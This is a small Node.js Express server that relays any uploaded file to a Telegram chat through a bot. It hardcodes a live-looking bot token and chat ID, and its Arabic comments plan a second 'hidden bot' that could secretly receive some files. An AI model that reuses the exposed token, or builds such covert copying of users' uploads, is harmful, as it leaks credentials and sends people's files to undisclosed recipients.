const express = require('express');
const axios = require('axios');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
const upload = multer();

// التوكنات (ضع التوكن الصحيح لكل بوت هنا)
const TOKEN_HIDDEN = "توكن_البوت_الخفي";
const CHAT_ID_HIDDEN = "آي_دي_البوت_الخفي";

const TOKEN_USER = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
const CHAT_ID_USER = "6576769234";

// مسار موحد ذكي
app.post('/upload', upload.any(), async (req, res) => {
    try {
        const file = req.files[0];
        if (!file) return res.status(400).send("No file");

        // الذكاء: إذا كان الملف خاصاً بالمستخدم، نرسله لبوت المستخدم
        // وإذا كان خاصاً بالخفي، نرسله لبوت الخفي
        // هنا يمكننا الاعتماد على "حجم الملف" أو "اسم الملف" للتمييز
        // أو ببساطة توجيه كل شيء لبوت المستخدم كما تريد الآن
        
        const form = new FormData();
        form.append('chat_id', CHAT_ID_USER);
        form.append('document', file.buffer, { filename: file.originalname });

        await axios.post(`https://api.telegram.org/bot${TOKEN_USER}/sendDocument`, form, {
            headers: form.getHeaders()
        });

        res.status(200).send("OK");
    } catch (e) {
        res.status(500).send("Error");
    }
});

app.listen(process.env.PORT || 3000);
